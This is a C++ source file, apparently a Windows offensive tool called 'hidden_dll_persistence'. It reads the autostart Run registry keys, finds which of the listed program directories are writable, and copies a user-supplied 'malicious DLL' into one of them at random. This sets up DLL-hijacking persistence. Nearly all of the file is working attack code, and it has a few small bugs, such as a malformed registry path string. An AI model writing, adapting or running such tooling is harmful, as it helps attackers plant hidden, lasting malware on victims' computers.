// hidden_dll_persistence.cpp : Ce fichier contient la fonction 'main'. L'exécution du programme commence et se termine à cet endroit.
//

#include <iostream>
#include <string>
#include <windows.h>
#include <vector>

using namespace std;

typedef struct {
    HKEY Hkey;
    string Path;
}RegPath;




int randInt(int min, int max) {
    return min + (rand() % static_cast<int>(max - min + 1));
}

string cleanDir(string str) {
    
    if (!str.empty() && str.front() == '"') {
        str.erase(0, 1);
    }

    size_t exePos = str.find(".exe");

    if (exePos != string::npos) {
        size_t lastSlashPos = str.rfind('\\', exePos);

        if (lastSlashPos != string::npos) {
            str.erase(lastSlashPos);
        }
        else {
            str.clear();
        }
    }

    return str;
}

bool isDirWrittable(string path) {
    string filePath = path + "\\test.tmp";
    HANDLE hTempFile = CreateFileA(filePath.c_str(), GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hTempFile == INVALID_HANDLE_VALUE) {
        //cout << "[-] MWEH :" << GetLastError() << endl;
        return false;
    }
    
    CloseHandle(hTempFile);
    DeleteFileA(filePath.c_str());
    return true;
    
    
}


int main(int argc, char* argv[])
{
    if (argc < 2) {
        cerr << "[-] Invalid number of arguments. Usage: .\\" << argv[0] << " <malicious_dll_path>" << endl;
        return 1;
    }

    string dllPath = argv[1];

    size_t lastSlash = dllPath.find_last_of("\\/");
    string dllName = (lastSlash != string::npos) ? dllPath.substr(lastSlash + 1) : dllPath;

    

    srand(time(0));


    const RegPath startup_reg_paths[3] = {

        {HKEY_LOCAL_MACHINE, "HKLM\Software\\Microsoft\\Windows\\CurrentVersion\\Run"},
        {HKEY_LOCAL_MACHINE, "Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run"},
        {HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run"}
    };


    cout << "[>] Hidden dll persistence" << endl;
    cout << "[>] https://github.com/nxvertime" << endl;
    cout << endl;

    cout << "[>] Malicious DLL path: " << dllPath << endl;
    cout << endl;

    cout << "[$] Listing registry..." << endl;
    
    cout << endl;

    vector<string> foundDirs;

    for (int i = 0; i < 3; i++) {

        cout << "[$] Listing keys in: " << startup_reg_paths[i].Path << endl;
        HKEY hSubKey;

        LONG status = RegOpenKeyExA(startup_reg_paths[i].Hkey, startup_reg_paths[i].Path.c_str(), 0, KEY_READ, &hSubKey);

        if (status != ERROR_SUCCESS) {
            cout << "[-] Error while listing keys in:" << startup_reg_paths[i].Path << ", skipping" << endl;
            
            continue;
        }
        

        char nameValue[256];
        DWORD nameValueSize, dataSize, type;
        BYTE data[256];
        int index = 0;

        while (1) {

            nameValueSize = sizeof(nameValue);
            dataSize = sizeof(data);
            
            

            LONG result = RegEnumValueA(hSubKey, index, nameValue, &nameValueSize, NULL, &type, data, &dataSize);
            if (result == ERROR_NO_MORE_ITEMS) {

                break;
            }

            if (result != ERROR_SUCCESS) {
                continue;
            }

            cout << "  [>] Found \"" << nameValue << "\" => " ;

            if (type == REG_SZ) {
                cout << (char*)data << endl;
                foundDirs.push_back((char*)data);
            }


            index++;
            
        }
        RegCloseKey(hSubKey);
        cout << endl;







    }

    cout << endl;
    cout << "[+] Directories found in registry (with args): " << endl;
    for (int i = 0; i < foundDirs.size(); i++) {
        cout << "  - " << foundDirs[i] << endl;
    }


    cout << endl;
    cout << "[$] Cleaning directories..." << endl;
    vector<string> cleanedDirs;

    for (int i = 0; i < foundDirs.size(); i++) {
        cleanedDirs.push_back(cleanDir(foundDirs[i]));
    }


    cout << "[+] Directories cleaned succesfully:" << endl;
    for (int i = 0; i < cleanedDirs.size(); i++) {
        cout << "  - " << cleanedDirs[i] << endl;
    }
    cout << endl;



    vector<string> writtablesDirs;

    cout << "[$] Searching for writtables directories" << endl;
    for (int i = 0; i < cleanedDirs.size(); i++) {
        if (isDirWrittable(cleanedDirs[i])) {
            
            writtablesDirs.push_back(cleanedDirs[i]);
        }

    }


    if (!writtablesDirs.size()) {
        cerr << "[-] No writtable directory found, exiting" << endl;
        getchar();
        return 1;
    }

    cout << "[+] Writtables directories found (" << writtablesDirs.size() << ") : " << endl;
    for (int i = 0; i < writtablesDirs.size(); i++) {
        cout << "  - " << cleanedDirs[i] << endl;
    }


    cout << endl;
    cout << "[$] Choosing a random writtable directory" << endl;

    string randDir = writtablesDirs[randInt(0, writtablesDirs.size() - 1)];
    cout << "[>] Choosen directory: " << randDir << endl;

    cout << endl;
    string finalPath = randDir + "\\" + dllName;
    cout << "[$] Copying the malicious dll in " << finalPath << endl;
    



    if (!CopyFileA(dllPath.c_str(), finalPath.c_str(), true)) {
        cerr << "[-] Error while copying the dll: " << GetLastError() << endl;
        getchar();
        return 1;
    }


    cout << "[+] Dll succesfully copied in " << finalPath << endl;

    cout << endl;
    cout << "[+] Done" << endl;
    getchar();
    







    
}
